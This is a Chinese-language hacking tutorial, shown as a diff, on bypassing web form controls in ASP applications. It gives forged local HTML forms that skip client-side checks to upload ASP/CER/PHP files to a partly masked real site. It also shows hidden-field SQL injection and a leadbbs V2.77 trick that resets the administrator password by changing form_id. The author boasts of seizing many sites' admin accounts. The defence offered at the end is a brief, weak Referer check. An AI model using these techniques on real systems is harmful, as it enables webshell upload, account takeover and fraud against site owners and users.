@@ -1,0 +1,90 @@
+在Web程序设计中，处理表单提交的数据是客户端向SERVER传递数据的主要方法，表单数据的提交方法有两种Post方法和Get方法，当使用Post方法时，数据由标准的
+输入设备读入，当使用Get方法时，数据由CGI变量QUERY_STRING传递给表单数据处理程序，当Post方法一般不会在服务器上留下痕迹。具体的实现过程这里我就不多说，
+有兴趣的朋友可以去翻阅其他资料。不管是ASP程序还是PHP，CGI程序，表单提交的作用的大同小异的，所以这里仅以ASP为例。
+
+             一.利用表单本地提交突破入侵限制
+   既然表单是客户端与服务端的重要数据传递方法之一，那么它的安全性就难免会出现问题。
+    
+1:上传非法文件。
+   
+   某同学录的popwindowupload1.asp的客户端代码如下：
+    
+< HTML>   ....       < Script language="javascript">     function mysubmit(theform)     {    if(theform.big.value=="")    {    alert("请点击浏览按钮，选择您要上传的jpg或gif文件!")    theform.big.focus;    return (false);    }    else    {    str= theform.big.value;    strs=str.toLowerCase();    lens=strs.length;    extname=strs.substring(lens-4,lens);    if(extname!=".jpg" && extname!=".gif")    {    alert("请选择jpg或gif文件!");    return (false);    }    }    return (true);    }    < /script>    .....    < input type="hidden" name="act" value="upload">    < input type="hidden" name="filepath" value="/alumni/class/classimage">    < input type="submit" name="Submit2" value="开始上传">     ....    < /HTML>
+
+   很明显，这个上传文件在客户端利用SCRIPT限制了上传类型，虽然用SCRIPT可以减轻ASP程序的负载，但象大部分好的方面一样也有它坏的一面，如果其只是在客户端做限制，并在服务端限制上传类型或禁止外部提交，那么它并不能阻止我们上传程序禁止上传的ASP，CER，PHP等文件，只要我们在本地构造一个表单也能能轻松的上传这些文件。
+
+  构造的表单主要代码如下：
+    .............
+
+< form name="mainForm" enctype="multipart/form-data" action="http://www.***                w.com/alumni/class/pic/upfile.asp?userid2=" method=post">          < tr>             < td width="74" align="right" height="26">标题：            < td width="399">十二少           < /tr>          < tr>             < td width="74" align="right" height="26">照片说明：            < td width="399">十二少's照片      < /td>          < /tr>          < tr>             < td width="74" align="right" height="26">图片路径：            < td width="399">               < input type="file" name="big">            < /td>          < /tr>          < tr align="center">             < td colspan="2" height="26">               < input type="hidden" name="act" value="upload">              < input type="hidden" name="filepath" value="/alumni/class/classimage">              < input type="submit" name="Submit2" value="开始上传">              < br>            < /td>          < /tr>          < tr align="center">             < td colspan="2" height="26" class="di">只支持jpg,gif文件，图片大小在                 150k< /font>以内，上传时请耐心等待！          < /tr>        < /form>
+
+        ....
+       只要将前面查看得到的代码中的验证文件类型的SCRIPT删掉，然后再修改ACTION后的URL保存为HTML文件即可
+     
+  2：突破表格注入限制
+      这个和前面一差不多就不再多说了（呵呵，其实是找不到实例拉）
+      另外字符输入的长度限制也差不多，只要你看得懂这些HTML语言。
+                                  二.HIDDEN隐藏字段缺陷
+     终于说到重点了。 
+  1：还是SQL注入问题。
+     目前SQL注入工击仍是入侵中的一大热点，不过随着时间的推移，一般的大型网站程序都已经将明显的
+  注入点打好补丁拉，但是一些隐藏的比较深的注入点却还是有不少的，除非将它所有的代码都翻新一片。
+   明显的注入点如：.asp?id=*，输入框等都已经过滤了，但这就能彻底的杜绝黑客的入侵吗？回答当然是NO
+  这就要提到本文的重点HIDDEN隐藏字段拉。
+       图1是某网游官方站点的帐号激活界面，查看源码，搜索"HIDDEN"字符串
+    
+
+< form action="index_game.asp" method="post" name="form1" target="_blank" >    ...    < td height="25" align="center">                                                   < input type="submit" name="Submit" value="提交">      ...                                                                  < /form>
+
+
+    如图2，看到了吗那个：
+     只要它没有在客户端做任何限制，
+  这就是一个注入点拉，将"user_name"的值"norfolk"改为想要注入的代码，然后和前面的一样将"ACTION"
+  的改为相应的URL，保存为HTML文件~~~~~~~~~
+    不过，它的安全还不错，提交后返回错误提示窗口，很显然它在服务端禁止了外部提交。
+2：非法修改其他用户密码。
+
+   典型的代表是leadbbs V2.77的那个密码修改漏洞：任何注册用户都可以修改管理员密码，从而入侵服务器，
+进而拿下主机。
+   登陆后修改密码，查看源码，其主要漏洞代码如下：
+.......
+
+
+< form action=usermodify.asp method=post name=form1 > < tr> < td align=middle height=25> < p>*用户名称： < td height=25> < p>norfolk  < tr> < td align=middle height=25> < p>*你的密码：  < td height=25> < input class=fminpt name=submitflag type=hidden value=52norflk> < input class=fminpt name=form_id type=hidden value=265>
+
+
+........ 
+
+其中我的from_id的值为265，在管理员例表中查看管理员ID，然后将它替换265，再将ACTION的URL相应的修改一下
+保存为HTML文件再提交就可以将管理员的密码改成52norfolk。
+  
+  这个漏洞早在2003.12月就已经公布，这里在拿出来只是为了说明一下这个HIDDEN隐藏字段的危害。不过我发现目前
+还是有不少程序可以任意修改其他用户的密码，至于方法如出一辙，(偶用这个漏洞拿下过不少站点的ADMIN):-_-
+
+3：任意修改价格以达到低价甚至不花一分钱网上购物。
+  
+    早在几年前国内国外的一些大型网上购物网站就已经出现过类似的漏洞。 这些网站的后台程序的验证机制并不健全
+以至可以在外部提交数据，于是便出现了低价甚至不花一分钱购买商品的事件，导致这些网站造成重大的经济损失，
+由此观之，网络安全是马虎不得的，即使一丁点而问题，造成的损失也是不可估量的。希望之后的程序员在编写程序时能
+  够尽量细心。这里我就不再将它的利用过程写出来了，反正它们的利用过程都基本相似。
+  
+  最后给大家介绍老外写的一个不错的检测WEB应用程序安全性的工具，一下是安全焦点的介绍：
+
+   Achilles是一个设计用来测试web应用程序安全性的工具。它是一个代理服务器，在一
+  个HTTP会话中扮演着"中间人"（man-in-the-middle）的角色。一个典型的HTTP代理服
+  务器将在客户浏览器和web服务器间转发数据包，但Achilles却载取发向任一方的HTTP会
+  话数据，并且在转发数据前可以让用户修改这些数据.
+  
+  相信在WEB入侵方面可以为您提供不少的帮助，如果有可能下次再专门写篇文章介绍它吧，这里我就不多说了，有兴趣的
+  朋友可以自己下载研究研究，它的下载地址：http://www.xfocus.net/tools/200403/achilles-0-27.zip
+  
+
+  后记：
+    到这里还是说一下解决方法吧。
+    首先当然是禁止外部提交，这里有种不错的方法，大家可以参考参考：
+
+
+< %         server_v1=Cstr(Request.ServerVariables("HTTP_REFERER"))         server_v2=Cstr(Request.ServerVariables("SERVER_NAME"))         if  mid(server_v1,8,len(server_v2))<>server_v2  then         % >         你想入侵我也不要这么麻烦嘛，直接打电话告诉我，我给你开WEBSHELL，呵呵         < %         Response.Redirect "Fuck-Hacker.asp"         end if         % >
+
+
+   但这不能彻底杜绝黑客对传递的DIDDEN数据的修改，前面那个ACHILLES就能修改，所以在服务端还要有健全的验证机制。
